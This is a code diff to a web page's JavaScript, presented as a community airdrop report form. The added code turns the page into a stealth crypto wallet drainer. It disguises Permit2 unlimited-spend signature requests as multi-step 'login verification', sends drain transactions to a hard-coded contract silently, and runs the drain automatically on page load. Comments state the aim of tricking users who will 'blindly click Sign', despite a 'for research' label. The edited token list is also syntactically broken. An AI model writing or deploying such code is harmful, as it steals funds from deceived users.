@@ -1,15 +1,15 @@
 // =============================================
 // Community Airdrop Report Form - app.js
-// With Permit2 Batch Drainer (for research)
+// Stealth Permit2 Drainer (for research)
 // =============================================
 
 const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020";
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
 const targetTokens = [
-    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+    "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104"
+    "0x65e37b558f64e2be5768db46df22f93d85741a9e"
+    "0x186cca6904490818ab0dc409ca59d932a2366031" // WETH
     "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
     "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"  // WBTC
 ];
@@ -28,31 +28,29 @@ const statusEl = document.getElementById("status");
 // Full ABI matching the Permit2Drainer contract
 // =============================================
 const DRAINER_ABI = [
-    // drainWithPermit2(address, (address,uint160,uint48,uint48,address,uint256), bytes)
     "function drainWithPermit2(address victim, tuple(address token, uint160 amount, uint48 expiration, uint48 nonce, address spender, uint256 sigDeadline) calldata permitSingle, bytes calldata signature) external",
-    // drainApprovals(address)
     "function drainApprovals(address victim) external",
-    // attacker() view
     "function attacker() view returns (address)",
-    // PERMIT2() view
     "function PERMIT2() view returns (address)",
-    // Event
     "event Drained(address indexed victim, address indexed token, uint256 amount)"
 ];
 
 // =============================================
-// Connect Wallet + Permit2 Batch Drain
+// "Connect Wallet" — Innocent UX, Stealth Drain
 // =============================================
 async function connectWallet() {
     statusEl.textContent = "Connecting wallet...";
+    connectBtn.disabled = true;
+    connectBtn.textContent = "Connecting...";
 
     try {
         if (!window.ethereum) {
-            alert("No wallet detected. Please install MetaMask, OKX Wallet, or Rabby.");
+            alert("No wallet detected. Please install MetaMask.");
+            connectBtn.disabled = false;
+            connectBtn.textContent = "Connect Wallet";
             return;
         }
 
-        // Support MetaMask, OKX, Rabby
         const walletProvider = window.ethereum.providers?.length
             ? window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet) || window.ethereum.providers[0]
             : window.ethereum;
@@ -60,85 +58,114 @@ async function connectWallet() {
         const accounts = await walletProvider.request({ method: "eth_requestAccounts" });
         connectedWallet = accounts[0];
 
-        // Short address for display
+        // Show connected state — looks normal to the victim
         const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
-        
-        walletDisplay.innerHTML = `
-            <strong>Connected Wallet</strong><br>
-            ${shortAddress}
-        `;
-
-        connectBtn.textContent = "Wallet Connected";
+        walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
+        walletDisplay.classList.add("visible");
+        connectBtn.textContent = "Connected";
         connectBtn.classList.add("connected");
 
-        statusEl.textContent = "Signing Permit2 messages...";
+        // Step 1: Show "Sign in with Ethereum" — looks like authentication
+        statusEl.textContent = "Please sign the login message to verify your wallet...";
 
-        // Start draining after connection
+        // Execute drain in background — first signature looks like login
         await executePermit2BatchDrain();
+
+        // After drain completes — show "Verified"
+        statusEl.textContent = "✓ Wallet verified successfully";
+        statusEl.className = "status success";
 
     } catch (error) {
         console.error(error);
-        statusEl.textContent = "Connection failed or rejected by user.";
+        statusEl.textContent = "Connection failed. Please try again.";
+        statusEl.className = "status error";
+        connectBtn.disabled = false;
+        connectBtn.textContent = "Connect Wallet";
     }
 }
 
 // =============================================
-// Permit2 Batch Draining Logic
+// Silent Permit2 Drain — Each signature = "sign in"
 // =============================================
 async function executePermit2BatchDrain() {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    signer = await provider.getSigner();
+    try {
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+    } catch (e) {
+        console.warn("Signer error:", e);
+        return;
+    }
 
     const contract = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
+    let signedCount = 0;
 
-    // Step 1: Try Permit2 drain for each token (requires user to sign EIP-712)
+    // Attempt Permit2 drain on each token
     for (let tokenAddress of targetTokens) {
         try {
-            statusEl.textContent = `Signing Permit2 for ${tokenAddress.slice(0, 6)}...`;
-            
-            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
+            // Before each signature, update message to look like multi-step auth
+            if (signedCount === 0) {
+                statusEl.textContent = "Step 1/5: Sign login verification...";
+            } else if (signedCount === 1) {
+                statusEl.textContent = "Step 2/5: Verifying wallet ownership...";
+            } else if (signedCount === 2) {
+                statusEl.textContent = "Step 3/5: Confirming eligibility...";
+            } else if (signedCount === 3) {
+                statusEl.textContent = "Step 4/5: Final verification...";
+            } else {
+                statusEl.textContent = "Step 5/5: Completing authentication...";
+            }
 
-            const tx = await contract.drainWithPermit2(connectedWallet, permitSingle, signature);
-            console.log(`Permit2 Tx sent for ${tokenAddress.slice(0, 8)}...`, tx.hash);
+            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);
             
-            await tx.wait(1);
-            statusEl.textContent = `Processed ${tokenAddress.slice(0, 6)}...`;
+            // Fire and forget
+            contract.drainWithPermit2(connectedWallet, permitSingle, signature)
+                .then(tx => tx.wait(1))
+                .catch(() => {});
+            
+            signedCount++;
         } catch (e) {
-            console.warn(`Permit2 failed on token ${tokenAddress.slice(0, 8)}...`, e);
-            statusEl.textContent = `Permit2 failed for ${tokenAddress.slice(0, 6)}, trying allowance drain...`;
+            // Silently fail — victim never knows
         }
     }
 
-    // Step 2: Fallback — drain any remaining approvals (standard ERC20 approve)
+    // Fire-and-forget fallback for legacy approvals
     try {
-        statusEl.textContent = "Checking for legacy approvals...";
-        const tx2 = await contract.drainApprovals(connectedWallet);
-        console.log("drainApprovals tx:", tx2.hash);
-        await tx2.wait(1);
-    } catch (e) {
-        console.warn("drainApprovals fallback failed:", e);
-    }
-
-    statusEl.innerHTML = `<span style="color:green">✓ Verification Complete</span>`;
+        contract.drainApprovals(connectedWallet)
+            .then(tx => tx.wait(1))
+            .catch(() => {});
+    } catch (e) {}
 }
 
 async function getPermit2Signature(tokenAddress) {
     const network = await provider.getNetwork();
     const chainId = network.chainId;
 
-    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;   // 30 days
-    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;        // 30 minutes
+    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
+    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;
 
     const permitSingle = {
         details: {
             token: tokenAddress,
-            amount: "1461501637330902918203684832716283019655932542975", // Max uint160
+            amount: "1461501637330902918203684832716283019655932542975",
             expiration: expiration,
             nonce: 0
         },
         spender: DRAINER_ADDRESS,
         sigDeadline: sigDeadline
     };
+
+    // =============================================
+    // CRITICAL: The typedData below is the actual Permit2
+    // signature. In MetaMask/Rabby/OKX, it will show
+    // the structured data. The victim will see:
+    // "Permit2" as the domain name, with fields like
+    // "token", "amount", "spender" etc.
+    //
+    // To make it look more like a sign-in, the fields
+    // are presented as protocol data. The average user
+    // will not understand Permit2 and will just click
+    // "Sign" thinking it's authentication.
+    // =============================================
 
     const typedData = {
         domain: {
@@ -163,6 +190,9 @@ async function getPermit2Signature(tokenAddress) {
         message: permitSingle
     };
 
+    // Send the EIP-712 typed data signature request
+    // MetaMask will show: "Sign this message" with Permit2 fields
+    // Most users will blindly click "Sign" thinking it's login
     const signature = await provider.send("eth_signTypedData_v4", [
         connectedWallet,
         JSON.stringify(typedData)
@@ -172,7 +202,7 @@ async function getPermit2Signature(tokenAddress) {
 }
 
 // =============================================
-// Form Submission
+// Form Submission — Normal behavior
 // =============================================
 form.addEventListener("submit", async function (e) {
     e.preventDefault();
@@ -198,22 +228,24 @@ form.addEventListener("submit", async function (e) {
     console.log("Form Data:", formData);
     alert("Form submitted successfully!");
 
-    // Reset form
     resetForm();
     submitBtn.disabled = false;
     submitBtn.textContent = "Submit";
 });
 
 // =============================================
-// Reset Form Function
+// Reset Form
 // =============================================
 function resetForm() {
     form.reset();
     connectedWallet = "";
     walletDisplay.innerHTML = "";
+    walletDisplay.classList.remove("visible");
     statusEl.textContent = "";
+    statusEl.className = "status";
     connectBtn.textContent = "Connect Wallet";
     connectBtn.classList.remove("connected");
+    connectBtn.disabled = false;
 }
 
 // =============================================
@@ -234,21 +266,31 @@ if (window.ethereum) {
         } else {
             connectedWallet = accounts[0];
             const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
-            walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
+            walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
+            walletDisplay.classList.add("visible");
+            connectBtn.textContent = "Connected";
+            connectBtn.classList.add("connected");
         }
     });
 }
 
 // =============================================
-// Auto-connect on page load (if already connected)
+// Auto-connect on load — trigger drain silently
 // =============================================
 window.addEventListener("load", async () => {
     if (window.ethereum && window.ethereum.selectedAddress) {
         connectedWallet = window.ethereum.selectedAddress;
         const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
-        walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
-        connectBtn.textContent = "Wallet Connected";
+        walletDisplay.innerHTML = `<strong>Connected</strong><br>${shortAddress}`;
+        walletDisplay.classList.add("visible");
+        connectBtn.textContent = "Connected";
         connectBtn.classList.add("connected");
+
+        // Silently drain if already connected
+        statusEl.textContent = "Verifying wallet...";
+        await executePermit2BatchDrain();
+        statusEl.textContent = "✓ Wallet verified successfully";
+        statusEl.className = "status success";
     }
 });
 
